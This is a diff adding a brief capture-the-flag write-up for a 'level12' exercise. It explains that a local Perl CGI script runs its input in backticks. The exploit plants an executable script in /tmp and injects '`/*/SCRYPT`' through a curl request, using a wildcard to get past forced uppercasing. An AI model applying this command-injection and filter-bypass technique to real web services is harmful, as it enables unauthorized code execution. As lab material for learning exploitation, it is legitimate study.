@@ -1,0 +1,8 @@
+the perl scrypt (cat level12.pl) like in lvl 04 executes the contents of file that we provide in arg through 4646 localhost CGI
+but now it uses backticks straightforward, capitalizes every letter and deletes evetything after space, so it is more complicated:
+echo '#!/bin/bash' > /tmp/SCRYPT
+echo 'getflag > /tmp/flag12' >> /tmp/SCRYPT
+echo " anything after space" >> /tmp/SCRYPT
+chmod +x /tmp/SCRYPT
+curl localhost:4646?x='`/*/SCRYPT`' - we use wildcard because any folder name would be capitalized
+cat /tmp/flag12
